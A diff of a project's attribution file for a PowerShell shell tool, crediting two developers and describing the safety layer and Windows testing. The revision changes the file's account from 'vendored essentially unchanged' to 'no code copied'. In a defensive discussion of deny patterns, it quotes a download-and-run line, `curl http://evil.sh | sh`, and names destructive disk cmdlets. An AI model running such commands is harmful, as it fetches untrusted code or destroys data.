@@ -1,87 +1,93 @@
 # Attribution
 
-This bundle consolidates work from two team members. It is a packaging effort,
-not an original implementation — the substance came from elsewhere and is
-credited here explicitly.
+The implementation in this repository is our own. Two prior works were studied
+as **reference** — their ideas shaped the design, and both deserve credit for
+getting there first. No code was copied from either.
 
 ---
 
-## Diego Colombo ([@colombod](https://github.com/colombod)) — the module
+## Diego Colombo ([@colombod](https://github.com/colombod))
 
-**Source:** [`colombod/amplifier-module-tool-pwsh`](https://github.com/colombod/amplifier-module-tool-pwsh)
-**Vendored at:** commit `e9139f0` (2026-04-28)
-**License:** MIT, "Copyright (c) Microsoft Corporation"
+**[`colombod/amplifier-module-tool-pwsh`](https://github.com/colombod/amplifier-module-tool-pwsh)**
+— MIT, "Copyright (c) Microsoft Corporation", studied at commit `e9139f0`
 
-Everything under `modules/tool-pwsh/`, plus `context/windows-shell.md` and
-`skills/powershell-windows-dev/`, is Diego's work, vendored essentially
-unchanged. That includes:
+Diego built the first working PowerShell tool for Amplifier and proved the
+shape. Two of his decisions we adopted wholesale as *design principles*:
 
-- The complete `pwsh` tool — 559 lines of module implementation
-- A **621-line PowerShell-shaped safety layer** with four profiles
-  (`strict` / `standard` / `permissive` / `unrestricted`)
-- Background execution, output truncation with UTF-8 boundary handling,
-  and process-group management for clean timeouts
-- The behavior, the always-on Windows context, the PowerShell skill,
-  and four test files
+**Mirror `tool-bash`'s config surface exactly.** Same four profile names
+(`strict` / `standard` / `permissive` / `unrestricted`), same
+`safety_profile` / `allowed_commands` / `denied_commands` keys. This matters
+more than it first appears: bundle config merges by *module ID*, so a second
+shell module normally means a second config surface that no existing bundle
+populates — an operator sets `safety_profile: strict` and it silently fails to
+apply to the new tool. Matching the surface makes operator muscle memory,
+documentation, and existing config all transfer intact.
 
-### Two design decisions of his worth calling out
-
-**He mirrored `tool-bash`'s config surface exactly.** Same four profile names,
-same `safety_profile` / `allowed_commands` / `denied_commands` keys. This
-matters more than it sounds: bundle config merges by *module ID*, so a second
-shell module would normally mean a second config surface that no existing
-bundle populates — an operator sets `safety_profile: strict` and it silently
-fails to apply to the new tool. Matching the surface means the muscle memory,
-the documentation, and the operator's mental model all transfer intact.
-
-**His safety layer is stronger than the shipped bash one.** Measured directly
-against `tool-bash`'s `safety.py`: it has **zero** patterns for remote-script
-execution across *all four* profiles — `curl … | sh` passes under `strict`.
-Diego's covers `|\s*Invoke-Expression`, along with `Set-ExecutionPolicy
-Bypass/Unrestricted`, `Start-Process -Verb RunAs`, registry-hive deletion, and
-disk operations (`Format-Volume`, `Clear-Disk`, `Initialize-Disk`,
-`Remove-Partition`).
+**Cover what the bash layer misses.** His pattern set includes
+`|\s*Invoke-Expression`, execution-policy bypass, `Start-Process -Verb RunAs`,
+registry-hive deletion, and disk operations. That coverage is the right
+instinct, and we measured why: `tool-bash`'s shipped `safety.py` has **zero**
+patterns for remote-script execution across *all four* profiles —
+`curl http://evil.sh | sh` returns `SafetyResult(allowed=True, reason=None)`
+under `strict`.
 
 ---
 
-## David Koleczek ([@DavidKoleczek](https://github.com/DavidKoleczek)) — the reference architecture
+## David Koleczek ([@DavidKoleczek](https://github.com/DavidKoleczek))
 
-**Source:** [`DavidKoleczek/agent-server`](https://github.com/DavidKoleczek/agent-server) —
-`src/agent_server/core/tools/powershell.py` (662 lines) and its test suite (602 lines)
+**[`DavidKoleczek/agent-server`](https://github.com/DavidKoleczek/agent-server)**
+— `src/agent_server/core/tools/powershell.py` (662 lines) and its 602-line
+test suite
 
-No code is copied from this repository. It was studied as a reference
-implementation, and it contributed the sharpest ideas in this design space.
-Several are not yet adopted here — see `docs/ROADMAP.md`, where each is
-attributed.
+David's implementation contains the sharpest ideas in this design space. Four
+shaped our architecture directly:
 
-**Job Object assignment behind a stdin gate.** A runner process blocks on
-`[Console]::In.ReadLine()`, is assigned to a Win32 Job Object *while still
-blocked*, and only then receives its payload. There is no window in which a
-child can escape the job — which means no PID-reuse race to narrow, because
-the race cannot occur. This is a categorically better answer than
+**The stdin gate.** A runner blocks on `[Console]::In.ReadLine()`, is assigned
+to a Win32 Job Object *while still blocked*, and only then receives its
+payload. There is no window in which a child can escape the job — the
+PID-reuse race is not narrowed, it cannot occur. Categorically better than
 assign-then-sweep-for-descendants.
 
-**Separating `$?` from `$LASTEXITCODE`.** PowerShell has two distinct notions
-of failure — cmdlet failure and native process exit — and collapsing them
-misreports outcomes. His test suite pins the subtlety precisely:
-`-ErrorAction SilentlyContinue` still yields **exit 1**, and only
-`try { … } catch {}; exit 0` genuinely succeeds.
+**Instrumenting the command, not the runner.** David appends the `$?` /
+`$LASTEXITCODE` capture to the user's *command text* rather than reading it
+after invocation. We initially got this wrong, shipped it green on Linux, and
+only a real-Windows run exposed why he does it that way. See
+[`docs/EVIDENCE.md`](docs/EVIDENCE.md) — it cost us a full debug cycle to
+rediscover a decision he had already made correctly.
 
-**Constraint checking via PowerShell's own AST parser.** Commands are parsed
-with `[System.Management.Automation.Language.Parser]::ParseInput`, checked as
-`CommandAst` nodes, and **parse errors are denied**. A validator that cannot
-parse its input must never report it safe — a principle worth stating in the
-general case.
+**Pinning the payload encoding.** PowerShell's `-EncodedCommand` convention is
+base64-of-UTF-16LE. Guessing passes every ASCII test and corrupts the first
+non-ASCII command *silently*.
 
-**Parametrized tests across both editions.** His suite runs against `pwsh.exe`
-and `powershell.exe` separately, skipping individually when one is absent.
-Both editions exist on a GitHub `windows-latest` runner, so tests in that
-shape genuinely execute in CI.
+**Parametrized tests across both editions**, skipping individually when one is
+absent. Both editions exist on a GitHub `windows-latest` runner, so tests in
+that shape genuinely execute in CI rather than skipping vacuously.
+
+**Not adopted:** AST-based constraint checking via
+`[System.Management.Automation.Language.Parser]`. It needs a live PowerShell
+process per validation call. We took the *principle* — a validator that cannot
+parse its input must not report it safe — via a cheaper structural gate, and
+recorded the trade-off honestly rather than claiming equivalence.
 
 ---
 
-## This bundle
+## Where this goes beyond both
 
-The packaging, the local-source rewiring, the Windows verification, and this
-document. The verification evidence is in `docs/EVIDENCE.md` — including the
-confound checks, and the hazards found but *not* fixed.
+Not a claim of superiority — a record of what running on real hardware
+surfaced that neither reference's shape would have caught in ours.
+
+**Two bugs found only by executing on native Windows.** The Linux suite was
+green — 171 passed — while both were live. Windows found them in one run:
+output encoding was pinned in one direction only, and `$?` read after
+`& $sb` reports the *scriptblock invocation*, not the user's command. Full
+detail, with the measured mojibake and the exit codes, in
+[`docs/EVIDENCE.md`](docs/EVIDENCE.md).
+
+**Tests that were pinning the bug.** Three contract tests asserted the *old,
+broken* decision table. They passed. Fixing the runner made them fail — which
+is how we learned they had been encoding the defect as the contract. They now
+assert the corrected invariants and go red against the old script.
+
+**Verified, not inferred.** 185 tests pass on native Windows 11 with **zero**
+skipped, including 14 live-execution tests confirmed to have actually run
+against both `pwsh` 7 and `powershell` 5.1 — counted, not assumed.
